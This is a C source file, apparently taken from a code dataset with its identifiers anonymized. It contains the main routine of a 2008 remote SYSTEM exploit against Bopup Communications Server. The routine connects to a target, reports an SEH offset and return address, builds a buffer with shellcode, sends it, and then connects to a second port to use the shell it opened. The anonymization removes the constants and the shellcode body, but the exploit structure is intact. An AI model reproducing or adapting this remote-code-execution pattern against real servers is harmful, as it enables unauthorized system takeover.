
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int FUNC_0 (int) ;
 int FUNC_1 (int) ;
 int FUNC_2 (int ,char*,char*,...) ;
 int FUNC_3 (char*,...) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int) ;
 int FUNC_6 (int,char*,int) ;
 int FUNC_7 (char*,int) ;
 int VAR_8 ;
 int FUNC_8 (char*) ;

int
FUNC_9 (int VAR_9, char **VAR_10)
{
  char VAR_11[VAR_3];
  int VAR_12, VAR_13;

  FUNC_3 ("Bopup Communications Server remote SYSTEM exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (VAR_9 <= 1)
    {
      FUNC_2 (VAR_8, "Usage: %s <host>\n", VAR_10[0]);
      FUNC_1 (VAR_5);
    }

  VAR_12 = FUNC_7 (VAR_10[1], VAR_6);
  if (VAR_12 == -1)
    {
      FUNC_2 (VAR_8, "%s: sockami failed\n", VAR_10[0]);
      FUNC_1 (VAR_4);
    }

  FUNC_3 ("* connected to %s:%d\n\n", VAR_10[1], VAR_6);

  FUNC_3 ("** SEH offset @+%04X\n", VAR_2 + VAR_1 - 8);
  FUNC_3 ("** return addy @0x%08X\n\n", VAR_0);

  FUNC_3 ("* building buffer with shellcode...");
  FUNC_8 (VAR_11);
  FUNC_3 ("done\n");

  FUNC_3 ("* sending request...");
  if ((VAR_13 = FUNC_6 (VAR_12, VAR_11, VAR_2 + VAR_1)) != VAR_2 + VAR_1)
    {
      FUNC_2 (VAR_8, "%s: sock_send returned %d (!= %d)\n",
               VAR_10[0], VAR_13, VAR_2 + VAR_1);
      FUNC_1 (VAR_4);
    }
  FUNC_3 ("done\n");
  FUNC_0 (VAR_12);

  FUNC_3 ("* waiting for the shellcode to be executed...\n");
  FUNC_5 (2);

  if ((VAR_12 = FUNC_7 (VAR_10[1], VAR_7)) != -1)
    {
      FUNC_3 ("+Wh00t!\n\n");
      FUNC_4 (VAR_12);
    }

  return (VAR_5);
}
